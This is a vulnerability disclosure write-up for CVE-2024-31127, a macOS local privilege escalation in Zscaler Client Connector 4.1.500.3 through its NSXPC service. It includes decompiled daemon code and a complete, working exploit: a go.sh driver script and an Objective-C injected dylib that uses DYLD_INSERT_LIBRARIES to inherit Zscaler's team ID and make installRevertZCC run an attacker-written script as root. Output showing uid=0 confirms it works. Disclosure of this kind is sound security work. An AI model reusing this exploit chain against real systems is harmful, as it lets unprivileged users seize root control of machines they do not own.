---
title:  "CVE-2024-31127: Zscaler Client Connector 4.1.500.3 NSXPC Local Privilege escalation"
categories: macOS
classes: wide
---

It was possible to achieve local privilege escalation (LPE) through the following high level abuse steps:

- A bypass of the hardened runtime and inheritance of Zscaler's signing team ID (`PCBCQZJ7S7`) through one of the following vectors:
    - A dylib load through `DYLD_INSERT_LIBRARIES` environment variable preloading 
    - A `@loader_path` search order hijack 
- Communication with the `ZscalerService` LaunchDaemon hosting a NSXPC interface (`com.zscaler.service-tray-communication`) which exposed functionality to execute arbritrary script content as root.



## Anatomy of the ZscalerService LaunchDaemon

The `shouldAcceptNewConnection` listener routine within the `ZscalerService` LaunchDaemon checks the incoming connection's `auditToken` whether the `TeamIdentifier` is (`PCBCQZJ7S7`) using the `PlatformUtils::validateTeamSignature` function , if the process doesn't have an `auditToken` it checks the pid for the `TeamIdentifier` (`PCBCQZJ7S7`) using the `PlatformUtils::validateTeamSignature` function. 

Once the `TeamIdentifier` has been verified to be Zscaler's `TeamIdentifier` of `PCBCQZJ7S7`, it then checks the `BundleIdentifier` and depending on the `BundleIdentifier`'s value it provides different protocol methods. 

For example, the following `BundleIdentifier`s result in the following remote object interface (`setRemoteObjectInterface`) and exported interface (`setExportedInterface`) protocols:
- `com.zscaler.zscaler` - `TrayXPCProtocol` + `XPCProtocol`
- `com.zscaler.tunnel` - `TunnelXPCProtocol` + `XPCProtocol`
- `com.zscaler.zscaler.pktfilter` - `FilterXPCProtocol` + `XPCProtocol`

It then checks whether the Mach service name is `com.zscaler.service-tray-communication`, if it is, it checks the incoming processes `BundleIdentifier` again and sets up remote connectors if required. 
- `com.zscaler.zscaler` - `trayRemoteConnector` or `setTrayRemoteConnector`
- `com.zscaler.tunnel` - `tunnelRemoteConnector` or `setTunnelRemoteConnector`
- `com.zscaler.zscaler.pktfilter` - `pktFilterRemoteConnector` or `setPktFilterRemoteConnector`


## Hardened runtime bypass
The `/Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel` Mach-O executable had the `com.apple.security.cs.allow-dyld-environment-variables` and `com.apple.security.cs.disable-library-validation` enitlements which facilitated a trivial dylib injection through the `DYLD_INSERT_LIBRARIES` environment variable.
```xml
07:41:36-testmac@mpro:~/Desktop/installRevertZCC/clean_exploit$ codesign -dv --entitlements :- /Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel
Executable=/Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel
Identifier=com.zscaler.tunnel
Format=Mach-O universal (x86_64 arm64)
CodeDirectory v=20500 size=288958 flags=0x10000(runtime) hashes=9019+7 location=embedded
Signature size=8972
Timestamp=31 Aug 2023 at 09:19:02
Info.plist entries=20
TeamIdentifier=PCBCQZJ7S7
Runtime Version=13.1.0
Sealed Resources=none
Internal requirements count=1 size=212
Warning: Specifying ':' in the path is deprecated and will not work in a future release
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>com.apple.security.cs.allow-dyld-environment-variables</key>
		<true/>
		<key>com.apple.security.cs.allow-jit</key>
		<true/>
		<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
		<true/>
		<key>com.apple.security.cs.disable-library-validation</key>
		<true/>
	</dict>
</plist>
```

Alternatively it was also possible to obtain code injection through abuse of the `@loader_path` dyld variable. This combined with the `com.apple.security.cs.disable-library-validation` entitlement facilitates arbitrary dylib loading through renaming a malicious dylib to be `libpacparser.1.dylib` and placing it in the same directory as the `ZscalerTunnel` Mach-O.
```bash
07:33:21-testmac@mpro:~/Desktop/installRevertZCC/clean_exploit$ otool -L /Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel
/Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel:
[...REDACTED FOR BREVITY...]
        @loader_path/libpacparser.1.dylib (compatibility version 0.0.0, current version 0.0.0)
[...REDACTED FOR BREVITY...]
```


## Abusable NSXPC Protocol
Within the `XPCProtocol` protocol, the following method was abused. 

```objc
- (void)installRevertZCC:(NSString *)arg1 reply:(void (^)(BOOL))arg2;
```


#### installRevertZCC
The `installRevertZCC` function could be identified through analysis of the `/Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerService` Mach-O NSXPC Daemon (`4.1.0.160`).

```objc
/* @class ZSService */
-(int)installRevertZCC:(int)arg2 reply:(int)arg3 {
    r15 = arg0;
    var_70 = [arg2 retain];
    var_58 = [arg3 retain];
    var_50 = @"UninstallApplication";
    *(&var_50 + 0x8) = @"osx-x86_64";
    *(&var_50 + 0x10) = @"arm-64";
    *(&var_50 + 0x18) = @"ZscalerUpdater";
    rax = [NSArray arrayWithObjects:rdx count:0x4];
    r14 = rax;
    var_78 = rax;
    rax = [ZSTrayUtils sharedInstance];
    rbx = [[rax fetchPIDsofProcessByNames:r14] retain];
    [rax release];
    var_60 = rbx;
    if ([rbx count] != 0x0) {
            r14 = [[var_60 objectForKeyedSubscript:@"UninstallApplication"] retain];
            r13 = [[var_60 objectForKeyedSubscript:@"osx-x86_64"] retain];
            r15 = [[var_60 objectForKeyedSubscript:@"arm-64"] retain];
            ZLogger::error(ZLogger::INSTANCE, "uninstaller: %d | installerPidX86: %d | installerPidARM: %d | autoupdater: %d is already running", r14, r13, r15, [[var_60 objectForKeyedSubscript:@"ZscalerUpdater"] retain], stack[-136]);
            (*(var_58 + 0x10))(var_58, 0x0);
    }
    else {
            ZLogger::info(ZLogger::INSTANCE, "installRevertZCC:: path=%s", [objc_retainAutorelease(var_70) UTF8String], 0x4, r8, r9, stack[-136]);
            [r15 installZCC:rax];
            (*(var_58 + 0x10))(var_58, 0x1);
    }
    var_30 = **___stack_chk_guard;
    rax = *___stack_chk_guard;
    rax = *rax;
    if (rax != var_30) {
            __stack_chk_fail();
    }
    return rax;
}
```


## installZCC
The `installZCC` function is called by the `installRevertZCC` function and checks for the presence of further Mach-O binaries and then sets up the commandline arguments. 

```objc
/* @class ZSService */
-(int)installZCC:(int)arg2, ... {
    r9 = arg5;
    r8 = arg4;
    rcx = arg3;
    rax = [arg2 retain];
    var_40 = rax;
    var_48 = [[rax stringByAppendingString:@"/Contents/MacOS/installbuilder.sh"] retain];
    r12 = [[rax stringByAppendingString:@"/Contents/MacOS/osx-x86_64"] retain];
    rax = [NSFileManager defaultManager];
    rdx = r12;
    r15 = [rax fileExistsAtPath:rdx];
    if (r15 != 0x0) {
            var_34 = chmod([objc_retainAutorelease(r12) UTF8String], 0x1e0);
    }
    else {
            var_34 = 0xffffffffffffffff;
            ZLogger::info(ZLogger::INSTANCE, "installZCC::installZCC: osx-x86_64 doesn't exist.", rdx, rcx, r8, r9, stack[-88]);
    }
    rbx = [[var_40 stringByAppendingString:@"/Contents/MacOS/osx-arm64"] retain];
    rax = [NSFileManager defaultManager];
    var_30 = rbx;
    rdx = rbx;
    r14 = [rax fileExistsAtPath:rdx];
    if (r14 != 0x0) {
            r13 = chmod([objc_retainAutorelease(var_30) UTF8String], 0x1e0);
    }
    else {
            ZLogger::info(ZLogger::INSTANCE, "installZCC::installZCC: osx-arm64 doesn't exist.", rdx, rcx, r8, r9, stack[-88]);
            r13 = 0xffffffffffffffff;
    }
    rax = objc_retainAutorelease(var_48);
    r12 = rax;
    rcx = [rax UTF8String];
    rax = [NSString stringWithFormat:@"/bin/sh %s  --revertzcc 1 --mode unattended --unattendedmodeui none --zinstallMode 1 ", rcx];
    rax = objc_retainAutorelease(rax);
    r14 = rax;
    ZLogger::info(ZLogger::INSTANCE, "installZCC::zapp updater command: %s", [rax UTF8String], rcx, r8, r9, stack[-88]);
    rcx = var_34;
    rax = rcx | r13;
    if (rax != 0x0) goto loc_10006ba6d;

loc_10006ba2c:
    rax = BundleUtils::runCommandToShell(r14);
    rax = objc_retainAutorelease(rax);
    rbx = rax;
    ZLogger::info(ZLogger::INSTANCE, "installZCC::zapp updater command result: %s", [rax UTF8String], rcx, r8, r9, stack[-88]);
    goto loc_10006bab7;

loc_10006bab7:
    goto loc_10006baee;

loc_10006baee:
    rax = [var_40 release];
    return rax;

loc_10006ba6d:
    if (rcx != 0xffffffff || r13 != 0xffffffff) goto loc_10006bac2;

loc_10006ba78:
    rax = BundleUtils::runCommandToShell(r14);
    rax = objc_retainAutorelease(rax);
    rbx = rax;
    ZLogger::info(ZLogger::INSTANCE, "installZCC::zapp updater command result: %s", [rax UTF8String], rcx, r8, r9, stack[-88]);
    goto loc_10006bab7;

loc_10006bac2:
    ZLogger::info(ZLogger::INSTANCE, "installZCC::installZCC=%s", [objc_retainAutorelease(r12) UTF8String], rcx, r8, r9, stack[-88]);
    goto loc_10006baee;
}
```


## BundleUtils::runCommandToShell
The `BundleUtils::runCommandToShell` function is called and has the commandline the caller wishes to be executed as root. 

```objc
int __ZN11BundleUtils17runCommandToShellEP8NSString(void * arg0) {
    cli_arguments = [arg0 retain];
    rax = objc_alloc_init(@class(NSTask));
    r12 = rax;
    [rax setLaunchPath:@"/bin/sh"];
    var_38 = r12;
    rax = [NSString stringWithFormat:@"%@", cli_arguments];
    rcx = rax;
    r13 = [[NSArray arrayWithObjects:@"-c"] retain];
    [rax release];
    var_60 = r13;
    [r12 setArguments:r13];
    rax = [NSPipe pipe];
    rdx = rax;
    [r12 setStandardOutput:rdx];
    var_48 = rax;
    var_58 = [[rax fileHandleForReading] retain];
    var_40 = objc_alloc_init(@class(NSMutableData));
    rax = [NSDate date];
    [rax timeIntervalSince1970];
    [rax release];
    xmm0 = intrinsic_cvtsi2sd(0x0, intrinsic_cvttsd2si([r12 launch], xmm0));
    var_78 = xmm0;
    while ([var_38 isRunning] != 0x0) {
            rax = [NSDate date];
            [rax timeIntervalSince1970];
            xmm0 = xmm0 - var_78;
            if (xmm0 > *double_value_5) {
                    ZLogger::info(ZLogger::INSTANCE, "time up! to execute the command:%s", [objc_retainAutorelease(cli_arguments) UTF8String], rcx, 0x0, r9, stack[-136]);
                    [var_38 terminate];
            }
            rax = [var_58 availableData];
            rdx = rax;
            [var_40 appendData:rdx];
    }
    if ([var_40 length] != 0x0) {
            r15 = [[NSString alloc] initWithData:var_40 encoding:0x4];
    }
    else {
            r15 = @"0";
    }
    rax = [r15 autorelease];
    return rax;
}
```

By calling the `installRevertZCC` method with a path which an attacker could create the `Contents/MacOS/` subdirectory structure under, e.g. `/tmp`, then the service will execute the `installbuilder.sh` within. 

```objc
[...REDACTED FOR BREVITY..]
    BOOL * res = false;
    [obj installRevertZCC:@"/tmp" reply:^(BOOL res) {
        NSLog(@"[installRevertZCC] Response: \"%hhd\"", res);
    }];
[...REDACTED FOR BREVITY..]
```

The logs written to the `ZSAService*.log` files within the `/Library/Application Support/Zscaler` directory validated the hypothesis and LPE could be achieved. 
```bash
08:04:29-testmac@mpro:/Library/Application Support/Zscaler$ cat ZSAService*.log | rg -i --hidden install
[...REDACTED FOR BREVITY..]
INF install**RevertZCC:: path=/tmp
INF installZCC::installZCC: osx-x86_64 doesn't exist.
INF installZCC::installZCC: osx-arm64 doesn't exist.
INF installZCC::zapp updater command: /bin/sh /tmp/Contents/MacOS/installbuilder.sh  --revertzcc 1 --mode unattended --unattendedmodeui none --zinstallMode 1
[...REDACTED FOR BREVITY..]
```


## Local Privilege Escalation Exploit
The following setup can be used to carry out the exploitation steps automatically. 
```bash
#!/bin/bash

#
# Zscaler Client Connector 4.1.500.3 Local Privilege Escalation
# Filename: go.sh
#

echo "[i] 0) whoami; id; uname -a; hostname"
whoami; id; uname -a; hostname

echo " "
echo "[i] 1) Setup"
echo "    [*] 1.1) Removing previous attempt if existing"
rm -rf /tmp/Contents 2>/dev/null

echo "    [*] 1.2) Creating directory"
mkdir -p /tmp/Contents/MacOS/

echo "    [*] 1.3) Creating exploit script"
cat << EOF > /tmp/Contents/MacOS/installbuilder.sh
#!/bin/bash
whoami > /tmp/whoami.txt && id >> /tmp/whoami.txt && uname -a >> /tmp/whoami.txt && date >> /tmp/whoami.txt
EOF

echo "    [*] 1.4) Setting executable bit on exploit & revert script"
ls /tmp/Contents/MacOS/installbuilder.sh
chmod +x /tmp/Contents/MacOS/installbuilder.sh

echo " "
echo "[i] 2) Compiling dylib for env var injection"
EXPLOIT=installRevertZCC
rm -rf $EXPLOIT.dylib
gcc -dynamiclib -framework Cocoa -framework Foundation -framework Security $EXPLOIT.m -o $EXPLOIT.dylib

echo " "
echo "[i] 3) Performing env var injection"
DYLD_INSERT_LIBRARIES=$EXPLOIT.dylib /Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel

echo " "
echo "[i] 4) Reading resultant output logfile"
cat /tmp/whoami.txt

echo " "
echo "[i] 5) Removing dylib"
rm -rf $EXPLOIT.dylib
```

The following Objective-C code connects to the `com.zscaler.service-tray-communication` NSXPC interface which can only be done if the `TeamIdentifier` of the connecting process matches `PCBCQZJ7S7`.
```c
/*
* Zscaler Client Connector 4.1.500.3 Local Privilege Escalation 
* Filename: installRevertZCC.m
*/

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <Cocoa/Cocoa.h>

@protocol XPCProtocol
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)installRevertZCC:(NSString *)arg1 reply:(void (^)(BOOL))arg2;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
    NSLog(@"[INFO] dylib constructor called from %s", argv[0]);

    static NSString* TrayTunnelCommunicationXPC = @"com.zscaler.service-tray-communication";
    NSString* _serviceName = TrayTunnelCommunicationXPC;
    NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
    
    [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(XPCProtocol)]];
    [_agentConnection resume];

    _agentConnection.interruptionHandler = ^{
        NSLog(@"[CONNECTTOHELPERTOOL_ERROR] Connection Terminated");
    };

    _agentConnection.invalidationHandler = ^{
        NSLog(@"[CONNECTTOHELPERTOOL_ERROR] Connection Interrupted");
    };

    id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"[CONNECTTOHELPERTOOL_ERROR] Something went wrong (remoteObjectProxyWithErrorHandler) %@", error);
        [[NSApplication sharedApplication] terminate:nil];
    }];

    NSLog(@"[CONNECTTOHELPERTOOL] obj: %@", obj);
    NSLog(@"[CONNECTTOHELPERTOOL] conn: %@", _agentConnection);
    [obj getVersionWithReply:^(NSString * version) {
        NSLog(@"[getVersionWithReply] version: %@", version);
    }];

    BOOL * res = false;
    [obj installRevertZCC:@"/tmp" reply:^(BOOL res) {
        NSLog(@"[installRevertZCC] Response: \"%hhd\"", res);
    }];

    [NSThread sleepForTimeInterval:5.0f];
    NSLog(@"[INFO] Exiting, bye bye !");

    [[NSApplication sharedApplication] terminate:nil];
}
```


## Resultant output
```bash
08:34:44-testmac@mpro:~/Desktop/installRevertZCC/clean_exploit$ ls
total 168
drwxr-xr-x  7 testmac  staff   224B Dec 10 08:34 .
drwxr-xr-x  5 testmac  staff   160B Dec 10 07:35 ..
-rw-r--r--  1 testmac  staff   1.2K Dec 10 08:31 go.sh
-rw-r--r--  1 testmac  staff   2.0K Dec 10 08:30 installRevertZCC.m
08:34:33-testmac@mpro:~/Desktop/installRevertZCC/clean_exploit$ bash go.sh 
[i] 0) whoami; id; uname -a; hostname
testmac
uid=501(testmac) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Darwin mpro.local 22.6.0 Darwin Kernel Version 22.6.0: Wed Jul  5 22:21:56 PDT 2023; root:xnu-8796.141.3~6/RELEASE_X86_64 x86_64
mpro.local
 
[i] 1) Setup
    [*] 1.1) Removing previous attempt if existing
    [*] 1.2) Creating directory
    [*] 1.3 Creating exploit script
    [*] 1.4) Setting executable bit on exploit & revert script
/tmp/Contents/MacOS/installbuilder.sh
 
[i] 2) Compiling dylib for env var injection
 
[i] 3) Performing env var injection
2023-12-10 08:34:39.051 ZscalerTunnel[3575:64120] [INFO] dylib constructor called from /Applications/Zscaler/Zscaler.app/Contents/PlugIns/ZscalerTunnel
2023-12-10 08:34:39.052 ZscalerTunnel[3575:64120] [CONNECTTOHELPERTOOL] obj: <__NSXPCInterfaceProxy_XPCProtocol: 0x7f9d5f70fa30>
2023-12-10 08:34:39.052 ZscalerTunnel[3575:64120] [CONNECTTOHELPERTOOL] conn: <NSXPCConnection: 0x7f9d602042d0> connection to service named com.zscaler.service-tray-communication
2023-12-10 08:34:39.068 ZscalerTunnel[3575:64122] [getVersionWithReply] version: Sending:4.1.500.3 on time: 2023-12-10 16:34:39 +0000
2023-12-10 08:34:39.092 ZscalerTunnel[3575:64122] [installRevertZCC] Response: "1"
2023-12-10 08:34:44.055 ZscalerTunnel[3575:64120] [INFO] Exiting, bye bye !
 
[i] 4) Reading resultant output logfile
root
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)
Darwin mpro.local 22.6.0 Darwin Kernel Version 22.6.0: Wed Jul  5 22:21:56 PDT 2023; root:xnu-8796.141.3~6/RELEASE_X86_64 x86_64
Sun Dec 10 08:34:39 PST 2023

[i] 5) Removing dylib
```